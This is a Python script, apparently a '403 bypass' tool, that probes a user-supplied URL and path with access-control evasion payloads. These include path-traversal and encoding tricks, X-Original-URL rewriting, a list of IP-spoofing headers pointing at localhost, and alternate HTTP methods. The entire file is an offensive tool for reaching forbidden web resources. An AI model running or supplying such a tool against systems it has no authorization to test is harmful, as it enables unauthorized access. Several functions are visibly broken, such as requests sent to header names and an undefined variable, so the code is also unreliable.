import requests
import sys
import threading
import re
from ipaddress import IPv4Network


def size(r):
    return str((len(r.content) / 1000)) + "KB"

def add_url_encode(url, path):
    try:
        payload = (f"{url}/%e2/{path}")
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', "X-Original-URL": f"{path}"})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

def add_dot(url, path):
    try:
        payload = f"{url}/{path}/."
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

def add_two_slashes(url, path):
    try:
        payload = f"{url}//{path}//"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
        payload = f"{url}//{path}"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

def add_two_dots(url, path):
    try:
        payload = f"{url}/./{path}/./"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

def add_original_header(url, path):
    try:
        payload = f"{url}/{path}/"
        r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
        print(f"X-Original-URL --> {payload} --> {r.status_code} --> {size(r)}")
    except:
        pass
    try:
        payload = f"{url}/asdnisaodnsakldmsads"
        r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
        print(f"X-Original-URL --> {payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

def rewrite(url, path):
    try:
        payload = f"{url}/{path}/"
        r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
    except:
        pass

def referer_header(url, path):
    try:
        payload = f"Referer: {url}/{path}"
        r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
        print(f"{payload} --> {url}/{path} --> {r.status_code} --> {size(r)}")
    except:
        pass

def add_header(url, path):
    localip = "127.0.0.1"
    payloads = [
        "Forwarded", "Forwarded-For", "Forwarded-For-Ip",
        "X-Client-IP", "X-Custom-IP-Authorization", "X-Forward", "X-Forwarded",
        "X-Forwarded-By", "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwared-Host",
        "X-Host", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Forwarded-Server", "X-HTTP-Host-Override"
    ]
    for payload in payloads:
        try:
            r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
            print(f"{payload}:{localip} --> {url}/{path} --> {r.status_code}")
        except:
            pass
    localip = "localhost"
    for payload in payloads:
        try:
            r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
            print(f"{payload}:{localip} --> {url}/{path} --> {r.status_code}")
        except:
            pass

def add_space_url_encode(url, path):
    try:
        payload = f"{url}/{path}%20"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass
    try:
        payload = f"{url}/{path}%09"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass
    try:
        payload = f"{url}/{path}?"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

    try:
        payload = f"{url}/{path}.html"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass
    
    try:
        payload = f"{url}/{path}?asds"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass
    
    try:
        payload = f"{url}/{path}#"
        r = requests.get(payload, timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"{payload} --> {r.status_code} --> {size(r)}")
    except:
        pass

def post_content_length(url, path):
    try:
        r = requests.get(payload, headers={"X-Original-URL": f"{path}", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}, timeout=5)
        print(f"Content-Length: 0 --> {url}/{path} --> {r.status_code} --> {size(r)}")
    except:
        pass

def pathManipulating(url, path):
    payloads = [
        path + '?',
        path + '??',
        path + '&',
        path + '%',
        path + '%20',
        path + '%09',
        path + '/',
        path + '..;/',
        './' + path,
        './' + path + '/',
        path + '//',
        path + ';/',
        path + '/*',
        path + '/.',
        path + './.',
        path + '/./',
        path + '%23',
        path + '~',
        path + '/~',
        path + '.json',
        path + '..%00/',
        path + "..%0d/",
        path + "..%5c",
        path + "..\\",
        path + "..%ff/",
        path + "%2e%2e%2f",
        path + "%26",
        path + "%3f",
        path + ".%e2/"
    ]
    for payload in payloads:
        try:
            my_payload = f"{url}/{payload}"
            r = requests.get(my_payload, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
            print(f"{my_payload} --> {r.status_code} --> {size(r)}")
        except:
            pass

def change_method(url, path):
    try:
        r = requests.post(f"{url}/{path}", timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"POST --> {url}/{path} --> {r.status_code} --> {size(r)}")
    except:
        pass

    try:
        r = requests.request("TRACE", f"{url}/{path}", timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"TRACE --> {url}/{path} --> {r.status_code} --> {size(r)}")
    except:
        pass

    try:
        r = requests.put(f"{url}/{path}", timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"PUT --> {url}/{path} --> {r.status_code} --> {size(r)}")
    except:
        pass

    try:
        r = requests.options(f"{url}/{path}", timeout=5, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'})
        print(f"OPTIONS --> {url}/{path} --> {r.status_code} --> {size(r)}")
    except:
        pass

if __name__ == "__main__":
    url = input("Enter the URL to test: ")
    path = input("Enter the path: ")

    print("""
    
    *****************************************************
    *_  _   __ __   ____   _____  __    __   __         *
    *| || | /  \__`.|  \ `v' / _,\/  \ /' _//' _/       *
    *`._  _| // |_ || -<`. .'| v_/ /\ |`._`.`._`.       *
    *   |_| \__/__.'|__/ 403Ruaad |_| |_||_||___/|___/  *
    *****************************************************
    """)

    add_url_encode(url, path)
    add_dot(url, path)
    add_two_slashes(url, path)
    add_two_dots(url, path)
    add_original_header(url, path)
    rewrite(url, path)
    referer_header(url, path)
    add_header(url, path)
    add_space_url_encode(url, path)
    post_content_length(url, path)
    pathManipulating(url, path)
    change_method(url, path)
